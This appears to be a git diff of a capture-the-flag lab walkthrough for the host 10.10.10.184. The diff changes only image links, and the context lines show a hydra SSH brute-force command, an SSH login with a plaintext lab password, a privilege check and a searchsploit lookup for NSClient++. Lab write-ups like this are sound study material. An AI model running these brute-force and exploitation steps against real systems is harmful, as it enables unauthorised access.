@@ -48,13 +48,13 @@ hydra -v -V -u -L users.txt -P passwords.txt -t 10 -u 10.10.10.184 ssh
 ssh Nadine@10.10.10.184
 L1k3B1gBut7s@W0rk
 ```
-![image](https://github.com/user-attachments/assets/99007e34-13e4-454b-9abc-137e67d22991)
+![image](https://github.com/user-attachments/assets/c149b9a4-6691-4919-8a4a-45145a226671)
 
 ```
 Powershell
 whoami /priv
 ```
-![image](https://github.com/user-attachments/assets/4cba395f-a2f2-4bbb-b358-2504e7170d29)
+![image](https://github.com/user-attachments/assets/daa65e49-b655-46e7-97c7-491e927bd449)
 
 ```
 searchsploit 'NSClient++'
